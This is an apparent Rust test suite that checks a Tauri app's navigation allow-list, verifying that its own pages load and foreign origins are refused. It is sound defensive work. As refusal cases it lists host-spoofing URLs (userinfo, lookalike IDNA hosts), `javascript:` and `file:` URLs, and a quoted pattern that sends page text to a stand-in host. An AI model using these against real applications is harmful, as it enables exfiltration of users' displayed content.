//! The navigation allow-list, asserted in both directions (SEC-02, ADR-0042
//! finding 1 and its 2026-08-28 correction, NFR-13).
//!
//! `src/services/navigation.rs` decides which URL either window is allowed to
//! *become*. Everything it decides lives in two public, pure functions —
//! [`is_internal`] and [`app_origins`] — precisely so that they can be asserted
//! with no webview, and this file asserts them.
//!
//! **Both directions are load-bearing, and the "too strict" one is the
//! expensive one.** A predicate that admits too much leaves the projector
//! reachable by `location = 'https://x/?' + document.body.innerText`. A
//! predicate that admits too *little* refuses the window its own pages, which
//! is a black screen in front of a congregation rather than a stricter
//! application. Every "admitted" case below exists for that reason, and a
//! failure in one of them is as serious as a failure in a "refused" one.
//!
//! An earlier form of this paragraph said the *first* navigation of every
//! window is decided here, citing wry's `attach_handlers` at
//! `webview2/mod.rs:466` running before the single `Navigate()` at `:531`.
//! That citation is correct and the sentence it carried was wider than it:
//! it shows wry's handler is installed in time, not that the navigation
//! reaches this module's predicate. The production docs retracted the claim in
//! round 2 (residual 1, "Three places this guard is not consulted, all failing
//! OPEN"), and it is retracted here too rather than left standing in the file
//! that is supposed to be the stricter of the two.
//!
//! **What this file does NOT prove, stated first so no name below is read as
//! claiming it.** `MockRuntime` never calls a navigation handler at all:
//! `grep -n navigation` over `tauri` 2.11.5 `test/mock_runtime.rs` returns
//! nothing, and its `create_window`/`create_webview` pairs drop
//! `pending.navigation_handler` without looking at it. So nothing here shows
//! that `wry` *cancels* a navigation, that WebView2 raises
//! `NavigationStarting` for a given URI, or that a refusal is visible to an
//! operator. Those are user-verifiable at runtime and nowhere else.
//!
//! What *is* proved is a chain of three links, and no test name claims a
//! fourth: `src/lib.rs` still names the guard in its builder chain (a grep, so
//! the weakest link); the object it names registers as a plugin under the
//! exported name; and that plugin's own `on_navigation` hook decides by origin
//! rather than by a constant. The fourth link — wry acting on the answer — is
//! not here. The third link was added in round 2: until then, replacing the
//! closure body with `|_, _| true` re-opened the whole of SEC-02 with every
//! gate green.
//!
//! **Every URL below was run through `url` 2.5.8 before it was asserted**, not
//! reasoned about. Several are here only because the answer was surprising:
//! `http://tauri.localhost@evil.com` has host `evil.com` (the app host is
//! userinfo), a backslash is folded to `/` so `http://tauri.localhost\@evil.com`
//! has host `tauri.localhost`, and IDNA maps U+3002 to a label separator so
//! `http://tauri.localhost。evil.com` becomes `tauri.localhost.evil.com`. The
//! last two are the pair that a `starts_with`/`contains` host comparison gets
//! wrong in opposite directions.
//!
//! This file lives beside `acl_window_scoping.rs` for the reason that file
//! gives at its foot: Cargo compiles an integration test only from the `tests/`
//! directory of the package it belongs to, and PRD §6.13's `tests/integration/`
//! is the tree this is the shell-crate half of. If it dies at load with
//! `STATUS_ENTRYPOINT_NOT_FOUND`, read `src-tauri/build.rs` — the cause is the
//! application manifest, not this file.

use aeroworship::services::navigation::{app_origins, guard, is_internal, PLUGIN_NAME};
use tauri::plugin::Plugin;
use tauri::test::{mock_builder, MockRuntime};
use tauri::utils::config::Config;
use tauri::{Url, WebviewWindowBuilder};

/// The Control Panel, spelled as `tauri.conf.json` spells it. It is the one
/// window this application *declares*, so it is the one whose
/// `useHttpsScheme` is read from configuration rather than defaulted.
const MAIN: &str = "main";

/// The Projector Output, spelled as `services::display::OUTPUT_WINDOW_LABEL`
/// spells it. It is built in code and appears in no `app.windows` entry, so it
/// exercises the fallback arm of the per-window lookup.
const OUTPUT: &str = "output";

/// A URL spelled as a person would write it, parsed the way `tauri` hands it to
/// the hook.
///
/// The panic message names the spelling, because a typo in a table entry below
/// would otherwise surface as an unattributed `unwrap` failure.
fn url(spelling: &str) -> Url {
    Url::parse(spelling).unwrap_or_else(|error| {
        panic!("this test means to ask about `{spelling}`, which does not parse: {error}")
    })
}

/// The application's shipped configuration — the same `tauri.conf.json` the
/// binary carries, not a fixture.
fn shipped_config() -> Config {
    // The runtime parameter is named only because `Context::config` is defined
    // on `Context<R: Runtime>`; nothing here runs on it.
    let context: tauri::Context<tauri::test::MockRuntime> = tauri::generate_context!();
    context.config().clone()
}

/// The allow-list this build serves the webview `label` its own documents from.
///
/// The label is not decoration: the served spelling is a **per-webview**
/// property (`app.windows[].useHttpsScheme`), so "the origins this build
/// serves" is not a question that can be asked without naming a window.
fn origins_of_this_build(label: &str) -> Vec<Url> {
    app_origins(&shipped_config(), label)
}

/// The tauri-protocol origin this platform serves, in the spelling selected by
/// `useHttpsScheme`.
///
/// **Exactly one spelling, not both.** wry computes `if use_https { "https" }
/// else { "http" }` once and registers the resource filter for that spelling
/// alone (`wry` `webview2/mod.rs:472`, `:930-948`); the other spelling is not
/// intercepted, falls through to the network stack and paints a Chromium error
/// page on the projector. So an allow-list that named both would be admitting
/// one externally reachable URL, which is what the round-1 form of this file
/// asserted as correct and what the round-2 fix removed.
///
/// The `cfg!` mirrors `navigation::tauri_protocol_origin`, which mirrors
/// `AppManager::tauri_protocol_url` (`tauri` `manager/mod.rs:336-345`); only
/// the Windows arm ships (NFR-17).
fn tauri_protocol_origin(https: bool) -> Url {
    if cfg!(any(windows, target_os = "android")) {
        if https {
            url("https://tauri.localhost")
        } else {
            url("http://tauri.localhost")
        }
    } else {
        url("tauri://localhost")
    }
}

/// The allow-list a **release** binary serves either shipped window, written
/// out rather than derived.
///
/// Deriving it from [`app_origins`] would make every assertion that uses it
/// tautological. It is written by hand and then pinned against the real
/// function by [`the_allow_list_is_the_served_origin_plus_the_dev_server_only_in_dev`],
/// so it cannot drift silently.
///
/// `false` is the spelling **both** shipped windows get today: `main` declares
/// no `useHttpsScheme` and the documented default is `false`
/// (`tauri-utils` `config.rs:2344`), and `output` is built in code with no
/// `app.windows` entry at all, so it takes the same fallback. That both labels
/// agree is asserted rather than assumed, so the day one of them stops agreeing
/// is a red test rather than a black screen on one window.
fn release_profile_origins() -> Vec<Url> {
    vec![tauri_protocol_origin(false)]
}

/// `build.devUrl` as `tauri.conf.json` declares it.
fn configured_dev_url() -> Url {
    shipped_config()
        .build
        .dev_url
        .expect("tauri.conf.json declares build.devUrl; without it the dev profile has no origin")
}

/// Asserts that every spelling is admitted against `allowed`, naming the whole
/// list when one is not.
///
/// The failure text says *blank*, not *insecure*, on purpose: this direction of
/// the predicate is the one whose failure mode is an empty projector.
fn assert_all_admitted(allowed: &[Url], spellings: &[&str], because: &str) {
    for spelling in spellings {
        assert!(
            is_internal(&url(spelling), allowed),
            "`{spelling}` must be admitted — {because}. The first navigation of every window \
             goes through this predicate (wry `webview2/mod.rs:466` runs before the `Navigate()` \
             at `:531`), so refusing this URL does not harden the application, it leaves a black \
             screen on the projector. This build serves: {allowed:?}"
        );
    }
}

/// Asserts that every spelling is refused against `allowed`, naming the whole
/// list when one is not.
fn assert_all_refused(allowed: &[Url], spellings: &[&str], because: &str) {
    for spelling in spellings {
        assert!(
            !is_internal(&url(spelling), allowed),
            "`{spelling}` must be refused — {because}. Admitting it lets a script move the \
             projector surface to a page this application does not serve, and carry the slide \
             text out with it in the query string (NFR-13). This build serves: {allowed:?}"
        );
    }
}

// ---------------------------------------------------------------------------
// The allow-list itself
// ---------------------------------------------------------------------------

/// The exact contents of the list, for both shipped windows and in both build
/// profiles.
///
/// This is the single assertion that fails if the dev branch is dropped, if the
/// dev server is admitted unconditionally, if the *unserved* tauri-protocol
/// spelling comes back, or if anything at all is added. It also pins
/// [`release_profile_origins`], so every other test in this file that uses that
/// helper is anchored to the real function rather than to a copy of it.
///
/// **`assert_eq!` over the whole vector, not `contains`.** The defect this
/// direction has to catch is a list one entry too *long*; a containment check
/// cannot see that, and the round-1 form of this file asserted a two-entry list
/// as correct for exactly that reason.
///
/// Both labels are asked, because the served spelling is a per-window property.
/// Both profiles are covered by one assertion rather than a `#[cfg]`, because
/// this crate is tested in both: `cargo test` is a dev build (`is_dev()` is
/// true, since the Tauri CLI is what turns `custom-protocol` on), and
/// `npm run test:perf:shell` is a release build with `custom-protocol`, where
/// `is_dev()` is false and the release arm of `app_origins` is the one that
/// runs. That second run is the only place the release branch is exercised for
/// real rather than simulated by a hand-written list, and since round 2 it is
/// also the only place the list is *one* entry long.
#[test]
fn the_allow_list_is_the_served_origin_plus_the_dev_server_only_in_dev() {
    let mut expected = release_profile_origins();
    if tauri::is_dev() {
        expected.push(configured_dev_url());
    }

    for label in [MAIN, OUTPUT] {
        assert_eq!(
            origins_of_this_build(label),
            expected,
            "the origins this build admits for window `{label}` are not the ones it serves. Too \
             few blanks a window; too many admits a URL that leaves the machine. Two entries in \
             particular: `{}` in a release binary is a local socket any process may occupy, the \
             defect `src/lib.rs` refuses to compile a binary for; and the tauri-protocol spelling \
             this build does *not* intercept falls through to the network stack and paints a \
             Chromium error page on the projector. is_dev() = {}",
            configured_dev_url(),
            tauri::is_dev()
        );
    }
}

/// Turning `useHttpsScheme` on for a declared window *moves* the served origin;
/// it does not blank the window.
///
/// This is the one promise `app_origins` makes that no shipped configuration
/// exercises: `tauri.conf.json` declares no `useHttpsScheme`, so every other
/// test in this file runs the `false` arm. Asserting it needs a configuration
/// built here, and it is worth building. The round-1 defect was an allow-list
/// naming a spelling the build does not serve; the shape that replaced it is
/// only safe if the *other* spelling is picked up when the setting really is
/// on, and the production docs promise exactly that. A promise nothing
/// exercises is a promise that quietly stops being true.
#[test]
fn turning_on_use_https_scheme_moves_the_served_origin_rather_than_blanking_the_window() {
    let mut config = shipped_config();
    let window = config
        .app
        .windows
        .iter_mut()
        .find(|window| window.label == MAIN)
        .expect("tauri.conf.json declares the `main` window");
    assert!(
        !window.use_https_scheme,
        "this test means to *change* the setting; if the shipped configuration already turns it \
         on, every other assertion in this file is written against the wrong spelling"
    );
    window.use_https_scheme = true;

    let allowed = app_origins(&config, MAIN);

    assert!(
        allowed.contains(&tauri_protocol_origin(true)),
        "with `useHttpsScheme` on, the served origin is the https spelling; a list that still \
         named only the http one would refuse the window its own pages: {allowed:?}"
    );
    assert!(
        !allowed.contains(&tauri_protocol_origin(false)),
        "the http spelling is not intercepted once `useHttpsScheme` is on, so leaving it on the \
         list re-creates the round-1 defect from the other side: {allowed:?}"
    );
    assert_all_admitted(
        &allowed,
        &["https://tauri.localhost/index.html"],
        "the window would load over https, so its own page has to be admitted",
    );
    assert_all_refused(
        &allowed,
        &["http://tauri.localhost/index.html"],
        "the spelling this configuration no longer serves is the one that reaches the network",
    );
    assert_eq!(
        app_origins(&config, OUTPUT),
        origins_of_this_build(OUTPUT),
        "the setting is per-window: changing it on `main` must not move `output`, which is built \
         in code and takes the documented default"
    );
}

// ---------------------------------------------------------------------------
// Must be admitted
// ---------------------------------------------------------------------------

/// The pages this application actually loads, in every spelling `tauri` or
/// WebView2 may hand over **of the origin it actually serves**.
///
/// `:80` is here because a browser calls a stated default port the same origin
/// as an omitted one; upper case and userinfo are here because neither is part
/// of an origin. All three are spellings `url` normalises away, which is *why*
/// they are asserted: the normalisation is a fact about the parser, and a
/// rewrite of this predicate that stopped relying on it would go red here
/// rather than in front of a congregation.
///
/// **Two entries were removed in round 2 and moved to
/// [`the_unserved_tauri_protocol_spelling_is_refused`].** In round 1 this test
/// asserted `https://tauri.localhost/...` as admitted, and it stayed green
/// across the round-2 fix because it builds its own list rather than calling
/// `app_origins`. A test that passes for a reason that has become wrong is
/// worse than one that goes red, so the entries are not deleted: they are
/// asserted in the opposite direction, where they now belong.
#[test]
fn a_release_build_admits_every_spelling_of_the_page_it_serves() {
    assert_all_admitted(
        &release_profile_origins(),
        &[
            "http://tauri.localhost/index.html",
            "http://tauri.localhost/output.html",
            "http://tauri.localhost/",
            "http://tauri.localhost",
            "http://tauri.localhost:80/index.html",
            "http://user:pass@tauri.localhost/index.html",
            "http://@tauri.localhost/index.html",
            "http://TAURI.LOCALHOST/index.html",
            "http://Tauri.LocalHost:80/output.html",
            "http://tauri.localhost/index.html?a=1#b",
        ],
        "a release binary serves both windows from the tauri-protocol origin in the one spelling \
         `useHttpsScheme` selects, and neither userinfo, case, a default port, a path, a query \
         nor a fragment is part of an origin",
    );
}

/// The tauri-protocol spelling this build does **not** serve is refused, in
/// both profiles.
///
/// It is the same host, the same asset handler and the same window: only the
/// scheme differs, and that is exactly why the round-1 predicate admitted it.
/// wry registers `AddWebResourceRequestedFilter` for the one spelling
/// `use_https` selects (`webview2/mod.rs:472`, `:930-948`), so the other one is
/// **not intercepted**: it leaves WebView2, resolves `tauri.localhost` to
/// loopback, is refused on a port nothing listens on, and the projector becomes
/// a Chromium error page. That is a PM-5 failure produced by the guard that
/// exists to prevent it, which is why this direction is asserted with the same
/// weight as any remote host.
///
/// This is the only refusal in the file whose *reason* is a property of the
/// build rather than of the URL, so it is stated here rather than folded into
/// a table: if `useHttpsScheme` is ever turned on, this URL becomes the one
/// that must be **admitted**, and
/// [`turning_on_use_https_scheme_moves_the_served_origin_rather_than_blanking_the_window`]
/// is where that is asserted.
#[test]
fn the_unserved_tauri_protocol_spelling_is_refused() {
    for label in [MAIN, OUTPUT] {
        assert_all_refused(
            &origins_of_this_build(label),
            &[
                "https://tauri.localhost/index.html",
                "https://tauri.localhost/output.html",
                "https://tauri.localhost:443/output.html",
                "https://tauri.localhost/",
            ],
            "neither shipped window sets `useHttpsScheme`, so https is the spelling wry does not \
             intercept for them; admitting it would put one externally reachable URL inside an \
             otherwise closed allow-list",
        );
    }
    assert_all_refused(
        &release_profile_origins(),
        &["https://tauri.localhost/index.html"],
        "the hand-written release list has to say the same thing as `app_origins`, or the tests \
         that use it are measuring a build that does not exist",
    );
}

/// The same, for the origin a `cargo tauri dev` run actually loads from.
///
/// Skipping this in a release run would be a test that measures nothing there;
/// instead the *whole* question is asked in both profiles by
/// [`the_dev_server_is_admitted_exactly_when_this_is_a_dev_build`], and this
/// one asserts the dev list — which in a release run is the release list — so
/// it stays a real assertion in both.
#[test]
fn a_dev_build_admits_the_vite_pages_the_windows_load() {
    if !tauri::is_dev() {
        // A release run has no dev server to admit; the profile-independent
        // half of this question is the test named above, which is not
        // conditional. Asserting the app's own pages here keeps this body from
        // being empty in that profile.
        assert_all_admitted(
            &origins_of_this_build(MAIN),
            &["http://tauri.localhost/index.html"],
            "a release build still serves its own pages from the tauri-protocol origin",
        );
        return;
    }

    assert_all_admitted(
        &origins_of_this_build(MAIN),
        &[
            "http://localhost:1420/index.html",
            "http://localhost:1420/output.html",
            "http://localhost:1420/",
            "http://localhost:1420",
            "http://tauri.localhost/index.html",
        ],
        "under `cargo tauri dev` both windows are loaded from build.devUrl, and the served \
         tauri-protocol origin is admitted in both profiles by design",
    );
}

// ---------------------------------------------------------------------------
// Must be refused
// ---------------------------------------------------------------------------

/// A host that merely *contains* or *begins with* the application's host is a
/// different host.
///
/// Every entry here is a host a substring comparison would admit, and the last
/// three are the ones that only running them reveals: a trailing dot is a
/// distinct host name, a Cyrillic а turns the label into a different punycode
/// label, and IDNA maps U+3002 (ideographic full stop) to a label separator so
/// `tauri.localhost。evil.com` really is a subdomain of `evil.com`.
#[test]
fn a_host_that_only_resembles_the_app_host_is_refused() {
    assert_all_refused(
        &release_profile_origins(),
        &[
            "http://tauri.localhost.evil.com/x",
            "http://tauri.localhost.evil.com:80/x",
            "https://tauri.localhost.evil.com/x",
            "http://evil.com/tauri.localhost",
            "http://eviltauri.localhost.com/x",
            "http://tauri.localhost./x",
            "http://tauri.loc\u{430}lhost/x",
            "http://tauri.localhost\u{3002}evil.com/x",
        ],
        "origin equality is host *equality*, not a substring test",
    );
}

/// The one that reads as safe and is not: `http://tauri.localhost@evil.com/x`
/// has host `evil.com`, because everything before the `@` is userinfo.
///
/// Its mirror image is in the admitted direction and is just as
/// counter-intuitive: `http://tauri.localhost\@evil.com/x` has host
/// `tauri.localhost` and path `/@evil.com/x`, because WHATWG folds a backslash
/// to a slash before the authority ends. Both are asserted here, together, so
/// the pair is read as a pair.
#[test]
fn the_authority_is_read_the_way_the_parser_reads_it_not_the_way_it_looks() {
    let allowed = release_profile_origins();

    assert_all_refused(
        &allowed,
        &[
            "http://tauri.localhost@evil.com/x",
            "http://tauri.localhost:80@evil.com/x",
        ],
        "everything before the `@` is userinfo, so the host here is `evil.com`",
    );
    assert_all_admitted(
        &allowed,
        &[
            r"http://tauri.localhost\@evil.com/x",
            r"http:\\tauri.localhost\index.html",
            r"http:/\tauri.localhost/index.html",
            "http://tauri%2elocalhost/index.html",
        ],
        "a backslash is folded to a slash and `%2e` is decoded in the host, so the parser's \
         answer for all four is host `tauri.localhost` — the same answer WebView2's own WHATWG \
         parser gives, which is what makes admitting them correct rather than lucky",
    );
}

/// IDNA and C0 stripping run *before* the host is compared, in both directions,
/// and the two directions look almost identical on the page.
///
/// U+FF0E (fullwidth full stop) is mapped to `.`, so `tauri<U+FF0E>localhost` is
/// the app's own host and must be admitted; U+3002 (ideographic full stop) is
/// mapped the same way, so `tauri.localhost<U+3002>evil.com` is a subdomain of
/// `evil.com` and must be refused - that one is asserted in
/// [`a_host_that_only_resembles_the_app_host_is_refused`]. A tab or a newline
/// inside the host is removed outright, which again yields the app's own host.
/// None of this is the predicate's doing; it is what the parser hands over, and
/// it is asserted so that a change in that layer arrives here rather than as a
/// blank projector or as an admitted stranger.
#[test]
fn idn_mapping_and_control_stripping_are_applied_before_the_host_is_compared() {
    assert_all_admitted(
        &release_profile_origins(),
        &[
            "http://tauri\u{ff0e}localhost/index.html",
            "http://tauri.local\thost/index.html",
            "http://tauri.local\nhost/index.html",
        ],
        "the parser maps U+FF0E to a label separator and strips tab and newline from a host, so \
         every one of these really is `tauri.localhost` - the same normalisation WebView2 \
         applies before it navigates",
    );
}

/// A different port is a different origin, and the dev host is the place that
/// matters: `localhost` is a socket any process on the machine may occupy.
#[test]
fn a_neighbouring_port_on_the_same_host_is_refused() {
    let mut allowed = release_profile_origins();
    allowed.push(configured_dev_url());

    assert_all_refused(
        &allowed,
        &[
            "http://localhost:1421/x",
            "http://localhost:1419/x",
            "http://localhost/x",
            "https://localhost:1420/x",
            "http://tauri.localhost:8080/x",
            "http://tauri.localhost:0/x",
            "http://tauri.localhost:65535/x",
        ],
        "scheme, host and port all have to match; `localhost` is a local socket any process may \
         occupy, so a neighbouring port is not a friendly neighbour",
    );
}

/// The dev server is admitted by a dev build and by nothing else.
///
/// One assertion rather than two `#[cfg]` halves, so it says something true and
/// checked in both profiles. Under `cargo test` it fails if the dev branch of
/// `app_origins` is removed; under `npm run test:perf:shell` it fails if a
/// release binary would admit `http://localhost:1420` — the defect
/// `src/lib.rs`'s `compile_error!` exists to prevent, asserted here on the
/// other side of the same rule.
#[test]
fn the_dev_server_is_admitted_exactly_when_this_is_a_dev_build() {
    let allowed = origins_of_this_build(MAIN);
    let dev_url = configured_dev_url();

    assert_eq!(
        is_internal(&url(dev_url.as_str()), &allowed),
        tauri::is_dev(),
        "`{dev_url}` must be admitted by a dev build (or its windows are blank under \
         `cargo tauri dev`) and refused by a release build (or a shipped binary trusts a local \
         socket any process may occupy). is_dev() = {}, list = {allowed:?}",
        tauri::is_dev()
    );
}

/// Schemes with no host can never match an origin, and the allow-list refuses
/// them for that reason rather than by an enumeration someone has to keep up to
/// date.
///
/// `blob:http://tauri.localhost/…` is the interesting member: it *looks* like
/// the app's own origin and parses with scheme `blob` and no host at all.
#[test]
fn a_url_with_no_host_is_refused_whatever_its_scheme_suggests() {
    assert_all_refused(
        &release_profile_origins(),
        &[
            "about:blank",
            "about:srcdoc",
            "data:text/html,<h1>x</h1>",
            "blob:http://tauri.localhost/0-0-0-0",
            "javascript:alert(1)",
            "file:///C:/Windows/win.ini",
            "file://tauri.localhost/x",
            "tauri:",
        ],
        "none of these is an origin this application serves, and a URL with no host cannot match \
         an entry that has one",
    );
}

/// Remote and loopback destinations, including the shapes an attacker reaches
/// for after the obvious ones fail.
#[test]
fn a_remote_or_loopback_destination_is_refused() {
    assert_all_refused(
        &release_profile_origins(),
        &[
            "https://evil.example/x",
            "http://127.0.0.1:1420/x",
            "http://2130706433/x",
            "http://[::1]/x",
            "http://[::1]:1420/x",
            "http://[::ffff:127.0.0.1]/x",
            "ws://tauri.localhost/x",
            "ftp://tauri.localhost/x",
            "https://xn--tauri-locahost.example/x",
        ],
        "the list is an allow-list, so a scheme or host nobody thought about is refused by \
         default rather than admitted by default",
    );
}

/// Length decides nothing; the origin decides everything.
///
/// The long query is the attack in its literal form — that query string is the
/// slide text — and the long path is its harmless twin on the app's own origin,
/// which must still be admitted.
#[test]
fn a_very_long_url_is_decided_by_its_origin_alone() {
    let allowed = release_profile_origins();
    let long_path = format!("http://tauri.localhost/{}", "a".repeat(100_000));
    let long_query = format!("https://evil.example/?{}", "x".repeat(100_000));
    let long_host = format!("http://tauri.localhost.{}.evil.com/x", "a".repeat(300));

    assert_all_admitted(
        &allowed,
        &[&long_path],
        "a long path is still this app's own page",
    );
    assert_all_refused(
        &allowed,
        &[&long_query, &long_host],
        "neither a 100 kB query nor a 300-character label makes a foreign origin familiar",
    );
}

/// An empty allow-list admits nothing, and a list of foreign origins admits
/// nothing either.
///
/// This is the shape that catches a predicate rewritten to return `true` on the
/// fall-through path: with no entry to match, the only correct answer is
/// `false` for every URL, including the application's own.
#[test]
fn an_allow_list_that_names_no_origin_admits_no_url() {
    assert_all_refused(
        &[],
        &[
            "http://tauri.localhost/index.html",
            "http://localhost:1420/index.html",
            "about:blank",
        ],
        "with nothing on the list there is nothing to match",
    );
    assert_all_refused(
        &[url("https://evil.example")],
        &["http://tauri.localhost/index.html"],
        "a list that names only a foreign origin admits only that foreign origin",
    );
}

/// The contract `is_internal` states about hostless entries, asserted.
///
/// Its documentation promises that "a candidate with no host at all can never
/// match, even if a malformed entry with no host were ever to reach `allowed`".
/// That promise is not redundant with the rest of the predicate: scheme, host
/// and port would all compare *equal* between `about:blank` and an `about:blank`
/// entry — `None == None` three times over — so without the explicit host check
/// a list that ever acquired a hostless entry would admit that scheme outright.
/// No entry the shipped `app_origins` builds is hostless today, which is why
/// this has to be asked with a list built here; a promise nothing exercises is a
/// promise that quietly stops being true.
#[test]
fn a_hostless_entry_on_the_list_still_admits_no_hostless_url() {
    assert_all_refused(
        &[url("about:blank"), url("data:,")],
        &["about:blank", "data:,", "javascript:alert(1)"],
        "`None == None` is not origin equality; a URL with no host matches nothing, and the \
         explicit host check in `is_internal` is what makes that true rather than the accident \
         that today's list happens to contain no hostless entry",
    );
}

// ---------------------------------------------------------------------------
// Facts about `url` that the predicate is built on
// ---------------------------------------------------------------------------

/// `Url::origin()` cannot be used here, and the reason is that it is not
/// reflexive for the scheme this application uses off Windows.
///
/// `url` 2.5.8 gives every non-special scheme an *opaque* origin, and an opaque
/// origin is not equal even to itself — `ascii_serialization()` is the literal
/// `"null"`. So `a.origin() == a.origin()` is `false` for
/// `tauri://localhost`, and a predicate written the obvious way would refuse
/// the application's own base URL on every non-Windows platform: a blank
/// projector, from the tidier-looking code. Confirmed by running it, which is
/// what this test is.
#[test]
fn url_origin_is_not_reflexive_for_the_tauri_scheme_so_it_cannot_be_used_here() {
    let tauri_url = url("tauri://localhost");

    assert_ne!(
        tauri_url.origin(),
        tauri_url.origin(),
        "`url` has stopped giving non-special schemes an opaque origin. That is good news, but \
         `src/services/navigation.rs` documents the opposite as the reason it spells origin \
         equality out by hand; update that reasoning before relying on `Url::origin()`"
    );
    assert!(!tauri_url.origin().is_tuple());
    assert_eq!(tauri_url.origin().ascii_serialization(), "null");

    let http_url = url("http://tauri.localhost");
    assert_eq!(
        http_url.origin(),
        url("http://tauri.localhost:80/other/path?q").origin(),
        "for a special scheme `Url::origin()` does behave; it is only the non-special ones that \
         cannot be compared this way"
    );
}

/// The residual the module documents, pinned rather than assumed.
///
/// `tauri-runtime-wry` parses the URI string WebView2 hands it and, when
/// parsing fails, **allows** the navigation (`lib.rs:4899-4906`,
/// `.unwrap_or(true)`). Anything `Url::parse` rejects is therefore never
/// offered to this predicate at all. These are the spellings found to be in
/// that set; the belief that the set is unreachable rests on WebView2's own
/// WHATWG parser refusing them first, which is a claim about WebView2 and not
/// something this file can check. It is asserted here so that a future `url`
/// which starts *accepting* one of them arrives as a red test rather than as a
/// silent widening of what the guard is asked about.
#[test]
fn the_spellings_url_refuses_are_the_ones_that_never_reach_this_predicate() {
    for spelling in [
        "//evil.example/x",
        "http://tauri.localhost /x",
        "http://tauri.localhost%00.evil.com/x",
        "http://tauri.localhost\u{0}/x",
    ] {
        assert!(
            Url::parse(spelling).is_err(),
            "`{spelling}` now parses, so it can reach the guard where before it could not. \
             Decide deliberately what the predicate should answer for it and add it to a table \
             above; do not delete this line"
        );
    }
}

// ---------------------------------------------------------------------------
// The plugin object
// ---------------------------------------------------------------------------

/// [`guard`] builds a plugin that registers under [`PLUGIN_NAME`].
///
/// **This does not show that a navigation is cancelled.** `MockRuntime` never
/// calls a navigation handler (see the module docs), so the hook body is not
/// reached by anything here. What is shown is that the object `run()` hands to
/// `Builder::plugin` is a plugin, that it registers, and that it registers
/// under the name this crate exports — which is what makes the two controls
/// below meaningful rather than decorative.
///
/// The controls are `AppHandle::remove_plugin` (`app.rs:569`): the first call
/// removes it and answers `true`, the second finds nothing and answers `false`.
/// A harness that never registered the plugin cannot make the first call true,
/// so this test cannot be green over a plugin that was merely compiled.
#[test]
fn the_guard_is_a_plugin_that_registers_under_its_exported_name() {
    let app = mock_builder()
        .plugin(guard())
        .build(tauri::generate_context!())
        .expect("the shipped tauri.conf.json and capabilities should build an app");

    assert!(
        app.handle().remove_plugin(PLUGIN_NAME),
        "the positive control: `{PLUGIN_NAME}` was registered on this builder one line ago, so \
         removing it must succeed. If it does not, either `guard()` does not build under this \
         name or the plugin never entered the store — and every other reading of this test would \
         be over a plugin that is not there"
    );
    assert!(
        !app.handle().remove_plugin(PLUGIN_NAME),
        "the negative control: nothing is registered under `{PLUGIN_NAME}` any more, so a second \
         removal must fail. If it succeeds, `remove_plugin` answers `true` unconditionally and \
         the positive control above proves nothing"
    );
}

/// The plugin's **own hook** admits the app's page and refuses a remote one.
///
/// **What this closes.** Every other assertion in this file calls
/// [`is_internal`] or [`app_origins`] directly, and the test above only shows
/// that the plugin object registers. Between them sits the closure inside
/// [`guard`], and until this test existed nothing looked at it: replacing its
/// body with `|_, _| true` re-opened the whole of SEC-02 with all seven gates
/// green. That is the gap the SEC-02 audit named as W4, and it is closed by
/// calling the hook rather than by reading it.
///
/// **What this still does not show, stated because the name is a claim.**
/// `Plugin::on_navigation` is invoked *here, by this test*. Nothing about wry
/// or WebView2 is exercised: `MockRuntime` never calls a navigation handler
/// (`grep -n navigation` over `tauri`'s `test/mock_runtime.rs` returns
/// nothing), so this does not show that the hook is reached during a real
/// navigation, and it does not show that a refusal cancels anything. The chain
/// this file can assert is now three links long
/// (`lib.rs` names the guard -> the guard registers -> the guard's hook decides
/// by origin) and the fourth link, wry acting on the answer, remains
/// user-verifiable only.
///
/// **Why a `Webview` and not a `WebviewWindow`.** `on_navigation` takes
/// `&Webview<R>` (`tauri` `plugin.rs:95`), which is what the hook is handed at
/// runtime; `WebviewWindow::as_ref()` produces exactly that. The window is
/// labelled `main` so `webview.label()` reaches the configured branch of the
/// per-window `useHttpsScheme` lookup rather than the fallback.
///
/// The refused call also runs `report_refusal`, which nothing else in this file
/// reaches. Its `eprintln!` on the test log is expected, and it is the only
/// place a reader can see that the diagnostic carries an origin and no path or
/// query.
#[test]
fn the_plugins_own_hook_admits_the_app_page_and_refuses_a_remote_one() {
    let app = mock_builder()
        .build(tauri::generate_context!())
        .expect("the shipped tauri.conf.json and capabilities should build an app");
    let window = WebviewWindowBuilder::new(&app, MAIN, Default::default())
        .build()
        .expect("the mock runtime should create a webview window");
    let mut plugin = guard::<MockRuntime>();

    let own_page = url("http://tauri.localhost/index.html");
    assert!(
        plugin.on_navigation(window.as_ref(), &own_page),
        "the guard's own hook refused `{own_page}`, the page this build serves window `{MAIN}`. \
         A hook that refuses the application's own URL does not harden anything; it is the \
         blank-projector failure, reached through the one code path no other test in this file \
         looks at"
    );

    let remote = url("https://evil.example/?lyrics-would-go-here");
    assert!(
        !plugin.on_navigation(window.as_ref(), &remote),
        "the guard's own hook admitted `{remote}`. The predicate answers correctly for this URL \
         (asserted above), so an admission here means the closure is not asking it \
         which is precisely the mutation `|_, _| true`, and it re-opens SEC-02 in full"
    );
}

/// `run()` still names the guard in its builder chain.
///
/// **This is a grep over source text, not a proof that `run()` ran.** It reads
/// `src/lib.rs` at compile time and looks for the registration line with `//`
/// comments stripped, so the line cannot pass while commented out. It does not
/// see a registration reached through an alias, a helper, or a differently
/// formatted call, and it cannot observe the builder actually executing —
/// `run()` blocks on a real event loop and no test starts one.
///
/// It is here because without it nothing in this suite fails when the one line
/// in `src/lib.rs` is deleted: [`the_guard_is_a_plugin_that_registers_under_its_exported_name`]
/// registers the plugin *itself*, which is exactly the residual the implementer
/// declared. This closes the cheap half of that residual and states plainly
/// which half stays open.
#[test]
fn lib_rs_still_registers_the_guard_in_the_builder_chain() {
    const REGISTRATION: &str = ".plugin(services::navigation::guard())";
    let code = include_str!("../src/lib.rs")
        .lines()
        .map(|line| line.split_once("//").map_or(line, |(before, _)| before))
        .collect::<Vec<_>>()
        .join("\n");

    assert!(
        code.contains(REGISTRATION),
        "`src/lib.rs` no longer contains `{REGISTRATION}` outside a comment. Without that line \
         no plugin answers `on_navigation`, `tauri`'s wrapper asks an empty plugin store, and \
         the store answers `true` for every URL (`plugin.rs:952-962`) — both windows become \
         navigable to any remote page again, with every test in this file still green, because \
         every other test here supplies the plugin or the predicate itself"
    );
}
